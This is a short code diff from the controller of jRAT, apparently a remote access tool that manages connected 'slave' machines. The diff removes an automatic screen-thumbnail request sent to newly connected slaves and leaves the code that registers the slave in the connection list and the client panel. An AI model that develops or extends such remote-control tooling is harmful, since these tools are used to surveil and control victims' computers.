@@ -3,11 +3,9 @@ package se.jrat.controller.net;
 import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Main;
 import se.jrat.controller.SampleMode;
-import se.jrat.controller.Slave;
 import se.jrat.controller.addons.PluginEventHandler;
 import se.jrat.controller.exceptions.CloseException;
 import se.jrat.controller.exceptions.DuplicateSlaveException;
-import se.jrat.controller.packets.outgoing.Packet40Thumbnail;
 import se.jrat.controller.utils.TrayIconUtils;
 
 public class ConnectionHandler {
@@ -18,10 +16,6 @@ public class ConnectionHandler {
 		} else {
 			slave.setAdded(true);
 			Main.connections.add(slave);
-
-			if (Main.instance.showThumbnails() && slave instanceof Slave) {
-				((Slave)slave).addToSendQueue(new Packet40Thumbnail());
-			}
 
 			Main.instance.getPanelClients().addSlave(slave);
 
